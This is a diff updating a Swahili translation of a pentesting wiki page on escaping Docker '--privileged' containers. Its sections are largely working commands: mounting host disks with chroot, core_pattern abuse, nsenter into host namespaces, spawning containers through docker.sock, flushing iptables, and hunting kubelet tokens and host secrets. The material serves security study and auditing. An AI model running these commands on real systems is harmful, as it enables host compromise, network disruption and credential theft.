@@ -1,38 +1,38 @@
-# Kutoka kwenye Kontena za `--privileged`
+# Kutoroka Kutoka kwenye `--privileged` Containers
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Muhtasari
 
-Kontena iliyoanzishwa kwa `--privileged` si sawa na kontena ya kawaida yenye ruhusa moja au mbili za ziada. Kwa vitendo, `--privileged` huondoa au kudhoofisha ulinzi kadhaa wa kawaida wa runtime ambao kwa kawaida huweka workload mbali na rasilimali hatari za host. Athari halisi bado hutegemea runtime na host, lakini kwa Docker matokeo ya kawaida ni:
+Container iliyoanzishwa kwa `--privileged` si sawa na container ya kawaida yenye permissions moja au mbili za ziada. Kwa vitendo, `--privileged` huondoa au kudhoofisha protections kadhaa za runtime ambazo kwa kawaida huweka workload mbali na resources hatari za host. Athari halisi bado hutegemea runtime na host, lakini kwa Docker matokeo ya kawaida ni:
 
 - capabilities zote hutolewa
-- vizuizi vya device cgroup huondolewa
-- filesystems nyingi za kernel hazipachikwi tena kama read-only
-- njia za procfs zinazofichwa kwa chaguo-msingi huondolewa
+- restrictions za device cgroup huondolewa
+- filesystems nyingi za kernel huacha ku-mountiwa kama read-only
+- default masked procfs paths huondolewa
 - seccomp filtering huzimwa
-- confinement ya AppArmor huzimwa
-- isolation ya SELinux huzimwa au hubadilishwa na label yenye wigo mpana zaidi
+- AppArmor confinement huzimwa
+- SELinux isolation huzimwa au kubadilishwa na label yenye wigo mpana zaidi
 
-Jambo muhimu ni kwamba kontena yenye `--privileged` kwa kawaida **haihitaji** kernel exploit changamano. Mara nyingi inaweza kuingiliana moja kwa moja na devices za host, filesystems za kernel zinazoelekea kwa host, au runtime interfaces, kisha kuingia kwenye shell ya host.
+Jambo muhimu ni kwamba privileged container kwa kawaida **haihitaji** kernel exploit ya kificho. Mara nyingi inaweza kuingiliana moja kwa moja na host devices, host-facing kernel filesystems, au runtime interfaces, kisha kufanya pivot hadi kwenye host shell.
 
-## Kile `--privileged` Haibadilishi Kiotomatiki
+## Kile ambacho `--privileged` Haibadilishi Kiotomatiki
 
-`--privileged` **haiunganishi kiotomatiki** namespaces za PID, network, IPC, au UTS za host. Kontena yenye privileged bado inaweza kuwa na namespaces zake binafsi. Hii inamaanisha kwamba baadhi ya escape chains zinahitaji sharti la ziada kama vile:
+`--privileged` **haijiungi kiotomatiki** na host PID, network, IPC, au UTS namespaces. Privileged container bado inaweza kuwa na private namespaces. Hii inamaanisha kwamba baadhi ya escape chains huhitaji condition ya ziada kama vile:
 
-- bind mount ya host
-- kushiriki PID ya host
-- network ya host
-- devices za host zinazoonekana
-- interfaces za proc/sys zenye uwezo wa kuandikwa
+- host bind mount
+- host PID sharing
+- host networking
+- host devices zinazoonekana
+- writable proc/sys interfaces
 
-Masharti hayo mara nyingi ni rahisi kutokea katika misconfigurations halisi, lakini kimawazo ni tofauti na `--privileged` yenyewe.
+Conditions hizo mara nyingi ni rahisi kutokea katika misconfigurations halisi, lakini kimawazo ni tofauti na `--privileged` yenyewe.
 
-## Njia za Escape
+## Escape Paths
 
-### 1. Pachika Disk ya Host Kupitia Devices Zilizo wazi
+### 1. Mount Host Disk Kupitia Devices Zilizo Exposeiwa
 
-Kontena yenye privileged kwa kawaida huona device nodes nyingi zaidi chini ya `/dev`. Ikiwa block device ya host inaonekana, escape rahisi zaidi ni kuipachika na kutumia `chroot` kuingia kwenye filesystem ya host:
+Privileged container kwa kawaida huona device nodes nyingi zaidi chini ya `/dev`. Ikiwa host block device inaonekana, escape rahisi zaidi ni kui-mount na kutumia `chroot` kuingia kwenye host filesystem:
 ```bash
 ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
 mkdir -p /mnt/hostdisk
@@ -46,15 +46,15 @@ fdisk -l 2>/dev/null
 blkid 2>/dev/null
 debugfs /dev/sda1 2>/dev/null
 ```
-Iwapo njia ya kiutendaji ni kuweka setuid helper katika host mount inayoweza kuandikwa badala ya kutumia `chroot`, kumbuka kwamba si kila filesystem hutii setuid bit. Ukaguzi wa haraka wa capability upande wa host ni:
+Ikiwa njia ya vitendo ni kuweka setuid helper kwenye mount ya host inayoweza kuandikwa badala ya kutumia `chroot`, kumbuka kwamba si kila filesystem huzingatia setuid bit. Ukaguzi wa haraka wa uwezo upande wa host ni:
 ```bash
 mount | grep -v "nosuid"
 ```
-Hii ni muhimu kwa sababu paths zinazoweza kuandikwa zilizo chini ya filesystems za `nosuid` hazivutii sana kwa workflows za kawaida za "weka shell ya setuid na uiendeshe baadaye".
+Hii ni muhimu kwa sababu njia zinazoweza kuandikwa ndani ya filesystems za `nosuid` hazivutii sana kwa workflows za kawaida za "weka shell ya setuid na uiendeshe baadaye".
 
 Protections zilizodhoofishwa zinazotumiwa vibaya hapa ni:
 
-- kufichuliwa kikamilifu kwa vifaa
+- ufichuaji kamili wa devices
 - capabilities pana, hasa `CAP_SYS_ADMIN`
 
 Kurasa zinazohusiana:
@@ -69,13 +69,13 @@ protections/namespaces/mount-namespace.md
 
 ### 2. Mount Au Tumia Tena Host Bind Mount Na `chroot`
 
-Ikiwa host root filesystem tayari ime-mount ndani ya container, au ikiwa container inaweza kuunda mounts zinazohitajika kwa sababu ina privileged access, mara nyingi kupata host shell kunahitaji `chroot` moja tu:
+Ikiwa root filesystem ya host tayari imewekwa ndani ya container, au ikiwa container inaweza kuunda mounts zinazohitajika kwa sababu ina privileged access, host shell mara nyingi hupatikana kwa `chroot` moja tu:
 ```bash
 mount | grep -E ' /host| /mnt| /rootfs'
 ls -la /host 2>/dev/null
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-Ikiwa hakuna host root bind mount iliyopo lakini host storage inaweza kufikiwa, unda moja:
+Ikiwa hakuna host root bind mount iliyopo lakini host storage inafikika, unda moja:
 ```bash
 mkdir -p /tmp/host
 mount --bind / /tmp/host
@@ -107,9 +107,9 @@ protections/selinux.md
 
 ### 3. Tumia Vibaya `/proc/sys` Au `/sys` Zinazoweza Kuandikwa
 
-Mojawapo ya madhara makubwa ya `--privileged` ni kwamba protections za procfs na sysfs huwa dhaifu zaidi. Hilo linaweza kufichua kernel interfaces zinazoelekea kwenye host ambazo kwa kawaida hufichwa au hu-mountiwa kwa read-only.
+Moja ya madhara makubwa ya `--privileged` ni kwamba ulinzi wa procfs na sysfs huwa dhaifu zaidi. Hii inaweza kufichua kernel interfaces zinazoelekea kwenye host ambazo kwa kawaida hufichwa au huwekwa read-only.
 
-Mfano wa kawaida ni `core_pattern`:
+Mfano wa kawaida ni `core_pattern`:<sup>[[1]](#references)</sup>
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] || exit 1
 overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -140,8 +140,8 @@ find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
 Njia hii hutumia vibaya:
 
-- paths zilizofichwa ambazo hazipo
-- system paths za kusoma pekee ambazo hazipo
+- masked paths ambazo hazipo
+- system paths za read-only ambazo hazipo
 
 Kurasa zinazohusiana:
 
@@ -153,25 +153,25 @@ protections/masked-paths.md
 protections/read-only-paths.md
 {{#endref}}
 
-### 4. Tumia Full Capabilities Kwa Escape Inayotegemea Mount Au Namespace
+### 4. Tumia Full Capabilities Kwa Mount- Au Namespace-Based Escape
 
-Container yenye privileges hupata capabilities ambazo kwa kawaida huondolewa kwenye containers za kawaida, zikiwemo `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, na nyingine nyingi. Mara nyingi hii inatosha kubadilisha foothold ya ndani kuwa escape kutoka kwa host pindi tu kunapokuwa na surface nyingine iliyo wazi.
+Container yenye privileged hupata capabilities ambazo kwa kawaida huondolewa kwenye containers za kawaida, zikiwemo `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, na nyingine nyingi. Mara nyingi hii inatosha kubadilisha foothold ya ndani kuwa host escape pindi tu surface nyingine iliyo exposed inapopatikana.
 
-Mfano rahisi ni ku-mount filesystems za ziada na kutumia namespace entry:
+Mfano rahisi ni kufanya mount ya filesystems za ziada na kutumia namespace entry:
 ```bash
 capsh --print | grep cap_sys_admin
 which nsenter
 nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
 ```
-Ikiwa host PID pia inashirikiwa, hatua hiyo huwa fupi zaidi:
+Ikiwa host PID pia imeshirikiwa, hatua huwa fupi zaidi:
 ```bash
 ps -ef | head -n 50
 nsenter -t 1 -m -u -n -i -p /bin/bash
 ```
 Njia hii hutumia vibaya:
 
-- seti chaguomsingi ya capabilities za privileged
-- kushiriki kwa hiari PID za host
+- seti chaguomsingi ya privileged capabilities
+- optional host PID sharing
 
 Kurasa zinazohusiana:
 
@@ -185,7 +185,7 @@ protections/namespaces/pid-namespace.md
 
 ### 5. Escape Kupitia Runtime Sockets
 
-Container yenye privileges mara nyingi huishia kuwa na hali ya runtime ya host au sockets zinazoonekana. Ikiwa socket ya Docker, containerd, au CRI-O inaweza kufikiwa, mbinu rahisi mara nyingi ni kutumia runtime API kuanzisha container ya pili yenye ufikiaji wa host:
+Privileged container mara nyingi huishia kuwa na host runtime state au sockets zinazoonekana. Ikiwa Docker, containerd, au CRI-O socket inafikika, mbinu rahisi zaidi mara nyingi ni kutumia runtime API kuzindua container ya pili yenye ufikiaji wa host:
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
@@ -196,7 +196,7 @@ ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
 ```
 Njia hii hutumia vibaya:
 
-- privileged runtime exposure
+- ufichuaji wa privileged runtime
 - host bind mounts zilizoundwa kupitia runtime yenyewe
 
 Kurasa zinazohusiana:
@@ -209,9 +209,9 @@ protections/namespaces/mount-namespace.md
 runtime-api-and-daemon-exposure.md
 {{#endref}}
 
-### 6. Ondoa Madhara ya Network Isolation
+### 6. Ondoa Madhara ya Kutengwa kwa Mtandao
 
-`--privileged` yenyewe haiunganishi container kwenye host network namespace, lakini ikiwa container pia ina `--network=host` au ufikiaji mwingine wa host network, network stack nzima inaweza kubadilishwa:
+`--privileged` yenyewe haiunganishi container kwenye host network namespace, lakini ikiwa container pia ina `--network=host` au ufikiaji mwingine wa host-network, network stack nzima inaweza kubadilishwa:
 ```bash
 capsh --print | grep cap_net_admin
 ip addr
@@ -220,7 +220,7 @@ iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link set lo down 2>/dev/null
 iptables -F 2>/dev/null
 ```
-Hii si mara zote huwa host shell ya moja kwa moja, lakini inaweza kusababisha denial of service, traffic interception, au ufikiaji wa management services zinazopatikana kwenye loopback pekee.
+Hii si mara zote huwa host shell ya moja kwa moja, lakini inaweza kusababisha denial of service, traffic interception, au ufikiaji wa management services zinazopatikana kupitia loopback pekee.
 
 Kurasa zinazohusiana:
 
@@ -232,15 +232,15 @@ protections/capabilities.md
 protections/namespaces/network-namespace.md
 {{#endref}}
 
-### 7. Kusoma Host Secrets Na Runtime State
+### 7. Soma Host Secrets Na Runtime State
 
-Hata wakati clean shell escape haipatikani mara moja, privileged containers mara nyingi huwa na ufikiaji wa kutosha kusoma host secrets, hali ya kubelet, runtime metadata, na container filesystems za jirani:
+Hata wakati clean shell escape haipatikani mara moja, privileged containers mara nyingi huwa na ufikiaji wa kutosha kusoma host secrets, hali ya kubelet, runtime metadata, na container filesystems za containers jirani:
 ```bash
 find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
 find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
 find /var/lib/containerd -type f 2>/dev/null | head -n 50
 ```
-Ikiwa `/var` ime-mountiwa kutoka kwa host au directories za runtime zinaonekana, hii inaweza kutosha kwa lateral movement au wizi wa cloud/Kubernetes credentials hata kabla ya kupata host shell.
+Ikiwa `/var` ime-mountiwa kutoka kwa host au runtime directories zinaonekana, hii inaweza kutosha kwa lateral movement au cloud/Kubernetes credential theft hata kabla ya host shell kupatikana.
 
 Kurasa zinazohusiana:
 
@@ -252,9 +252,9 @@ protections/namespaces/mount-namespace.md
 sensitive-host-mounts.md
 {{#endref}}
 
-## Ukaguzi
+## Checks
 
-Madhumuni ya commands zifuatazo ni kuthibitisha ni familia zipi za privileged-container escape zinaweza kutumika mara moja.
+Madhumuni ya commands zifuatazo ni kuthibitisha ni privileged-container escape families zipi zinaweza kutumika mara moja.
 ```bash
 capsh --print                                    # Confirm the expanded capability set
 mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
@@ -263,15 +263,15 @@ grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
 cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
 find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
 ```
-Nini kinachovutia hapa:
+Kinachovutia hapa ni:
 
-- seti kamili ya capabilities, hasa `CAP_SYS_ADMIN`
-- ufichuaji wa `proc/sys` unaoweza kuandikwa
-- vifaa vya host vinavyoonekana
-- kutokuwepo kwa seccomp na MAC confinement
+- full capability set, hasa `CAP_SYS_ADMIN`
+- writable proc/sys exposure
+- visible host devices
+- kukosekana kwa seccomp na MAC confinement
 - runtime sockets au host root bind mounts
 
-Kimoja tu kati ya hivyo kinaweza kutosha kwa post-exploitation. Vingi kwa pamoja kwa kawaida humaanisha kuwa container iko umbali wa command moja au mbili tu kutoka kwa compromise ya host.
+Yoyote kati ya hizi inaweza kutosha kwa post-exploitation. Kadhaa kati yao kwa pamoja kwa kawaida humaanisha kuwa container iko umbali wa amri moja au mbili tu kutoka kwa host compromise.
 
 ## Kurasa Zinazohusiana
 
@@ -310,4 +310,9 @@ protections/namespaces/pid-namespace.md
 {{#ref}}
 protections/namespaces/network-namespace.md
 {{#endref}}
+
+## Marejeo
+
+- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)
+
 {{#include ../../../banners/hacktricks-training.md}}
